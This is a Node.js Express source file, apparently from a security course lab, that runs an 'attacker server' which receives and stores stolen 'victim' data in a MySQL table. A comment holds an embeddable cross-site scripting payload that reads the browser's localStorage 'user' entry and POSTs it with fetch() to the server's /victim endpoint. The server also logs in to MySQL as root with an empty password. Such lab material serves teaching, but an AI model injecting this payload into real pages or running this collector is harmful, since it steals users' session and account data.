var express = require('express');
var mysql = require('mysql');
var bodyParser = require('body-parser');
const cors = require('cors')
var app = express();

var connection = mysql.createConnection({
  host     : 'localhost',
  user     : 'root',
  password : ''
});

connection.query('USE cs4417_attacker_db');

app.set('port', 3001);
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.options('*', cors())

/*
Eample code to embed

Object.keys(localStorage)

let params = {
  headers: {
    'content-type': 'application/json; charset=UTF-8'
  },
  body: JSON.stringify({ content: localStorage.getItem('user') }),
  method: 'POST'
};
fetch('http://127.0.0.1:3001/victim', params)
*/
app.post('/victim', cors(), function(request, response) {
  const contentIn = request.body.content;
  connection.query(
    'INSERT INTO victim_data (victim_string) VALUES (?)',
    [contentIn],
    function(err, result) {
      // response.status(201).send({ status: 'Created' });
      console.log('NEW: ', contentIn);
      response.end();
    });
});

app.listen(3001, function () {
  console.log('Attacker server started on port 3001');
});